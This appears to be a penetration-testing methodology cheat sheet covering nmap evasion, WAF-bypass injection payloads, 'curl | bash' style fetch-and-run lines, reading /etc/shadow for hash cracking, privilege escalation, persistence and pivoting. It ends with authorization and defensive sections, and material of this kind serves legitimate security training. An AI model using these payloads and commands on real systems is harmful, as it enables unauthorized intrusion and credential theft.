# Deep Dive: Security Testing - Complete Methodology

## TABLE OF CONTENTS
1. [Old School Techniques](#old-school-techniques)
2. [Modern Techniques](#modern-techniques)
3. [Stealth & Evasions](#stealth--evasions)
4. [Brute Force Methods](#brute-force-methods)
5. [Social Engineering](#social-engineering)
6. [Physical Access](#physical-access)
7. [Cryptography & Passwords](#cryptography--passwords)
8. [Network Pivoting](#network-pivoting)
9. [Post-Exploitation](#post-exploitation)
10. [2025-2026 Trends](#2025-2026-trends)

---

## 1. OLD SCHOOL TECHNIQUES

### The Foundation (Pre-2010)

#### Network Scanning
```bash
# Classic nmap techniques
nmap -sS -sV -O target.com           # SYN scan
nmap -sT -sV target.com               # TCP Connect scan
nmap -sU target.com                   # UDP scan
nmap -sF target.com                   # FIN scan (stealth)
nmap -sX target.com                  # Xmas scan
nmap -sN target.com                  # Null scan
nmap -sP target.com                  # Ping sweep
nmap -sV -sC target.com              # Default scripts
```

#### Port Scanning Methods
| Technique | Command | Description |
|-----------|---------|-------------|
| SYN Scan | `nmap -sS` | Half-open, stealthy |
| TCP Connect | `nmap -sT` | Full handshake |
| FIN Scan | `nmap -sF` | Bypasses stateless firewalls |
| Xmas Scan | `nmap -sX` | Sets all flags |
| Null Scan | `nmap -sN` | No flags set |
| ACK Scan | `nmap -sA` | Maps firewall rules |

#### Banner Grabbing
```bash
# Netcat
nc -nv target.com 80
nc -nv target.com 21 22 25 110

# cURL
curl -v target.com
curl -I target.com

# Telnet
telnet target.com 80
```

#### DNS Enumeration
```bash
# Zone transfer
dig axfr @ns1.target.com target.com
host -l target.com ns1.target.com

# DNS recon
dnsenum target.com
dnsmap target.com
fierce --domain target.com
```

#### Old School Exploitation
```bash
# Searchsploit
searchsploit apache 1.3
searchsploit vsftpd 2.3.4
searchsploit -m 5622.py

# MSF console commands
msf > search type:exploit platform:linux
msf > use exploit/linux/http/cisco_ios_shell
msf > set RHOST target.com
msf > exploit
```

---

## 2. MODERN TECHNIQUES

### Current Attack Vectors (2024-2026)

#### Initial Access
```bash
# Phishing 2.0
# - OAuth token theft
# - MFA fatigue attacks
# - Adversary-in-the-middle (AiTM)

# Cloud exploitation
# - IAM misconfigurations
# - S3 bucket leaks
# - Service principal abuse

# Supply chain
# - NPM packages hijacking
# - CI/CD pipeline attacks
# - Docker image compromises
```

#### API Attacks
```bash
# REST API fuzzing
ffuf -w wordlist.txt -u https://api.target.com/FUZZ
ffuf -w parameters.txt -u https://api.target.com/?param=FUZZ

# GraphQL
# - Introspection queries
# - Batch queries
# - Alias abuse
```

#### Container Escape
```bash
# Check capabilities
capsh --print

# Escape from container
# - Host network access
# - Volume mount escape
# - Kernel exploit
docker --rm -it --privileged ubuntu bash
```

---

## 3. STEALTH & EVASIONS

### Network Evasions

#### Firewall/IDS Evasion
```bash
# Fragmentation
nmap -f target.com
nmap --mtu 16 target.com

# Decoys
nmap -D RND:10 target.com
nmap -D decoy1,decoy2,decoy3,ME target.com

# Source port manipulation
nmap -g 53 target.com

# Timing (slower = stealthier)
nmap -T1 target.com
nmap --scan-delay 1s target.com

# Packet length manipulation
nmap --data-length 100 target.com
```

#### WAF Bypass Techniques (2025)
```bash
# SQL Injection bypass
' OR 1=1 --
' OR '1'='1' --
'/**/OR/**/1=1--
0x OR 1=1--

# XSS bypass
<script>alert(1)</script>
<svg onload=alert(1)>
<img src=x onerror=alert(1)>
<ScRiPt>alert(1)</sCrIpT>

# Command injection
;ls -la
|ls -la
`ls -la`
$(ls -la)
```

#### EDR Evasion (2025)
```bash
# Syscall hooking bypass
# - Direct syscalls (SysWhispers)
# - syswhispers3
# - HellsGate

# ETW tampering
# - Block ETW
# - Patch ETW

# AMSI bypass
# - PowerShell downgrade
# - Memory patching

# DLL unhooking
# - Load clean DLLs
# - Manual mapping
```

### Living Off The Land (LotL)
```bash
# Windows
certutil.exe -encodedfile -decode
rundll32.exe
regsvr32.exe
mshta.exe vbscript:msgbox(1)
powershell -enc

# Linux
curl | bash
wget -O- | bash
python -c
perl -e
base64 -d
```

---

## 4. BRUTE FORCE METHODS

### Password Cracking Techniques

#### Attack Types
| Type | Description | Best For |
|------|-------------|----------|
| Dictionary | Wordlist only | Common passwords |
| Brute Force | All combinations | Short passwords |
| Hybrid | Dictionary + rules | Human-created passwords |
| Mask | Pattern-based | Known patterns |
| Rainbow Table | Precomputed hashes | Fast hashes (MD5, NTLM) |

#### Hashcat Advanced Usage
```bash
# Basic
hashcat -m 0 hash.txt wordlist.txt                    # MD5
hashcat -m 1000 hash.txt wordlist.txt               # NTLM
hashcat -m 1800 hash.txt wordlist.txt               # SHA-512 Unix

# WPA/WPA2
hashcat -m 2500 capture.hccapx wordlist.txt         # Hccapx
hashcat -m 22000 pmkid.txt wordlist.txt             # PMKID

# Rules (Hybrid)
hashcat -m 0 hash.txt wordlist.txt -r rules/best64.rule
hashcat -m 0 hash.txt wordlist.txt -r rules/d3ad0ne.rule
hashcat -m 0 hash.txt wordlist.txt -r rules/hybrid/

# Mask attack
hashcat -m 0 hash.txt -a 3 ?l?l?l?l?l?l
hashcat -m 0 hash.txt -a 3 Summer2024!

# GPU acceleration
hashcat -m 0 hash.txt wordlist.txt -D 1,2          # GPU only
```

#### John The Ripper
```bash
# Basic
john --wordlist=wordlist.txt hash.txt

# Format
john --format=raw-md5 hash.txt
john --format=raw-sha256 hash.txt

# Rules
john --wordlist=wordlist.txt --rules hash.txt

# Combine files
unshadow /etc/passwd /etc/shadow > hash.txt

# Show results
john --show hash.txt
```

#### Wordlist Generation
```bash
# Crunch
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
crunch 8 8 0123456789 -o pins.txt                    # PINs

# CUPP
cupp -i                                              # Interactive
cupp -w target-name                                  # From name

# CeWL (spider website)
cewl -w passwords.txt https://target.com
cewl -d 2 -m 5 https://target.com

# Default passwords
wget https://raw.githubusercontent.com/duyetdev/bruteforce/master/default-passwords.txt
```

#### Target-Specific Wordlists
```bash
# Username harvesting
theHarvester -d target.com -b all
whois target.com
metagoofil -d target.com -f pdf

# Custom rules based on OSINT
# - Company name + year
# - Pet names + numbers
# - Sports teams + years
```

---

## 5. SOCIAL ENGINEERING

### Classic Techniques

#### Pretexting
```bash
# Phone-based
# - IT support call
# - Vendor verification
# - Executive urgency

# Email-based
# - Fake invoice
# - HR document
# - Shipping notification
```

#### Social Engineering Toolkit (SET)
```bash
# Spear phishing
setoolkit
# 1) Social-Engineering Attacks
# 2) Spear-Phishing Attack Vectors
# 3) Clone a website

# Credential harvesting
# - Clone login page
# - Tabnabbing
# - Web jacking
```

### Modern Social Engineering (2025)

#### MFA Fatigue/Bombing
```bash
# Attack flow:
# 1. Get credentials
# 2. Trigger login
# 3. Flood victim with MFA requests
# 4. Victim approves out of frustration
```

#### OAuth Token Theft
```bash
# - Malicious OAuth app
# - Token phishing
# - Session hijacking
```

---

## 6. PHYSICAL ACCESS

### Old School Physical

#### Lock Bypass
```bash
# Lock picking (requires tools)
# - Padlock shimming
# - Key impressioning
# - Bump keys
# - Combo cracking

# Tailgating
# - Badge cloning
# - Social engineering at door
```

#### USB Attacks
```bash
# Rubber Ducky
# - Keystroke injection
# - HID attack

# USB drop
# - Baited USB drives
# - malicious files
```

#### Network Jacking
```bash
# - RJ45 insertion
# - VoIP tapping
# - Rogue AP deployment
```

### Modern Physical (2025)

#### Badge Cloning
```bash
# Proxmark3
# - Read RFID
# - Clone card
# - Emulate
```

#### Evil USB-C
```bash
# - USB-C debug accessories
# - Thunderbolt attacks
# - Hardware implants
```

---

## 7. CRYPTOGRAPHY & PASSWORDS

### Hash Types & Identification
```bash
# HashID
hashid hash.txt
hashid -m hash.txt

# Hash examples
# MD5:        d41d8cd98f00b204e9800998ecf8427e
# SHA1:       da39a3ee5e6b4b0d3255bfef95601890afd80709
# SHA256:     e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855
# NTLM:       31d6cfe0d16ae931b73c59d7e0c089c0
# WPA2:       b8d4a3... (hex, 32 bytes)
```

### Common Hash Modes (Hashcat)
| Mode | Hash Type |
|------|-----------|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1700 | SHA512 |
| 1000 | NTLM |
| 2500 | WPA/WPA2 |
| 22000 | WPA-PMKID-PBKDF2 |
| 400 | phpass |
| 3200 | bcrypt |

### Encryption Cracking
```bash
# PDF
pdfcrack encrypted.pdf

# ZIP
fcrackzip -u -p wordlist.txt file.zip

# TrueCrypt/VeraCrypt
# - Mount and memory dump
# - Password recovery tools

# Office documents
# - msoffice-crack.py
```

### Cryptanalysis Basics
```bash
# XOR analysis
# - xortool
xortool -l 32 ciphertext.bin

# Frequency analysis
# - CyberChef
# - dcode.fr

# Classical ciphers
# - Caesar
# - Vigenère
# - Atbash
```

---

## 8. NETWORK PIVOTING

### Port Forwarding
```bash
# SSH
ssh -L 8080:localhost:80 user@target
ssh -R 4444:localhost:22 user@target
ssh -D 1080 user@target                    # SOCKS proxy

# Metasploit
# - portfwd add -l 8080 -p 80 -r target
# - route add target 255.255.255.0 session1
```

### Pivoting Techniques
```bash
# ProxyChains
# - Edit /etc/proxychains.conf
# - proxychains nmap -sT target

# Chisel (modern)
# Client: chisel client target:8080 socks
# Server: chisel server --port 8080 --reverse

# Sshuttle
sshuttle -r user@target 10.0.0.0/8
```

### VPN Pivoting
```bash
# OpenVPN
# - tun2socks
# - n2n

# Bettercap
# - Bettercap provides modular approach
```

---

## 9. POST-EXPLOITATION

### Linux Privilege Escalation
```bash
# Enumeration scripts
wget linpeas.sh
chmod +x linpeas.sh && ./linpeas.sh

# Manual checks
sudo -l
find / -perm -4000 2>/dev/null
find / -writable 2>/dev/null
cat /etc/passwd
crontab -l
ps aux
netstat -tulpn

# Kernel exploits
uname -a
searchsploit linux kernel $(uname -r)
```

### Windows Privilege Escalation
```bash
# Enumeration
powershell -ep bypass -f PowerUp.ps1
powershell -ep bypass -f WinPEAS.ps1

# Service exploits
# - Unquoted service paths
# - Weak service permissions
# - Service binary replacement

# Registry
# - AlwaysInstallElevated
# - Autorun entries
# - Stored credentials
```

### Persistence
```bash
# Linux
# - SSH keys: ~/.ssh/authorized_keys
# - Cron: /etc/crontab
# - Bash rc: ~/.bashrc
# - Systemd service

# Windows
# - Registry: HKCU\Software\Microsoft\Windows\CurrentVersion\Run
# - Scheduled tasks
# - Services
# - WMI event subscription
```

---

## 10. 2025-2026 TRENDS

### Emerging Techniques

#### AI-Powered Attacks
```bash
# LLM-based recon
# - Automated target analysis
# - Phishing email generation
# - Code generation for exploits

# Deepfakes
# - Voice cloning
# - Video manipulation
```

#### Supply Chain Evolution
```bash
# - Rust/Cargo attacks
# - Go module poisoning
# - PyPI typosquatting
# - Container image infections
```

### Zero-Day Trends
```bash
# 2025-2026 focus areas:
# - Cloud identity (OAuth/SAML)
# - CI/CD pipelines
# - Container runtime
# - AI/LLM APIs
# - IoT firmware
```

### Defense Evasion (2025)
```bash
# - Fileless malware
# - Memory-only payloads
# - EDR killing
# - BYOVD (Bring Your Own Vulnerable Driver)
```

---

## QUICK REFERENCE: ATTACK CHAIN

```
1. RECONNAISSANCE
   ├── OSINT
   ├── Active scanning
   └── Information gathering

2. INITIAL ACCESS
   ├── Phishing
   ├── Exploit
   ├── Credentials
   └── Supply chain

3. EXECUTION
   ├── Shellcode
   ├── Script
   └── Application

4. PERSISTENCE
   ├── Registry
   ├── Services
   ├── Cron
   └── Backdoors

5. PRIVILEGE ESCALATION
   ├── Kernel exploits
   ├── Misconfigurations
   └── Token manipulation

6. DEFENSE EVASION
   ├── Disabling AV
   ├── Bypassing EDR
   └── Lateral movement

7. CREDENTIAL ACCESS
   ├── Hash dumping
   ├── Keylogging
   └── Memory access

8. LATERAL MOVEMENT
   ├── Pass the hash
   ├── RDP hijacking
   └── SSH pivoting

9. COLLECTION
   ├── Data staging
   └── Sensitive files

10. EXFILTRATION
    ├── Encrypted channels
    └── DNS tunneling
```

---

## BEST PRACTICES FOR TESTING

### Always
- [ ] Get written authorization
- [ ] Define scope clearly
- [ ] Document everything
- [ ] Use isolated tools
- [ ] Clean up after

### Tool Selection
| Goal | Tool |
|------|------|
| Network scan | Nmap, Masscan |
| Web app | Burp, Nuclei, SQLMap |
| Password | Hashcat, John |
| Exploit | Metasploit, manual |
| Stealth | Custom payloads, proxies |

---

## DEFENSIVE COUNTERMEASURES

### Detection
```bash
# Network monitoring
# - Zeek
# - Suricata
# - Wireshark

# Host monitoring
# - Auditd
# - OSSEC
# - Wazuh
```

### Hardening
```bash
# Network
# - Segmentation
# - Firewall rules
# - IDS/IPS

# Systems
# - Patching
# - Least privilege
# - MFA enforcement
```
